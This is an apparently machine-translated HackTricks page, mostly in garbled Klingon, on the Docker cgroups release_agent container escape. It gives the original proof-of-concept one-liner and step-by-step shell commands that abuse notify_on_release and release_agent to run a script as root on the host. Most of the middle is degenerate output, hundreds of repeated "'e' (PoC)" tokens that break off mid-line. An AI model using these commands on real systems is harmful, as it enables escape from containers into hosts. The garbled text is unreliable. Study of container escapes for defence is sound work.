# Docker release_agent cgroups escape

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


**For further details, refer to the [original blog post](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** This is just a summary:

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
**PoC** (Proof of Concept) **tlhIngan Hol** (PoC) **vItlhutlh** (PoC) **cgroups** **ghItlh** (PoC) **exploit** **ghItlh** (PoC) **method** **ghItlh** (PoC) **jImej** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (PoC) **'e'** (
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **QapwI' Cgroup Qap:**
- "x" nom vItlhutlh cgroup yIlo'laHbe'.
- "x" cgroup notify_on_release file vIghojmoH 1 qar'a'.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **QapHa' Release Agent:**
- /etc/mtab file laH container path host DaH ghaH.
- cgroup release_agent file /cmd script DaH execute laH configured. /cmd acquired host path DaH.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Qap je QaDwI' je:**
- QaDwI' DaH jImejDaq /cmd script yIlo'lu' 'ej /output file vItlhutlh. /output Daq host Daq path vItlhutlh.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **QapHa'wI'**: 
- "x" vItlhutlh cgroupDaq 'e' vItlhutlh process vItlhutlh.
- 'ej vItlhutlh 'e' vItlhutlh `release_agent` (the /cmd script) vItlhutlh, 'ej 'oH ps aux HostDaq vItlhutlh 'ej /output containerDaq vIghoS.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
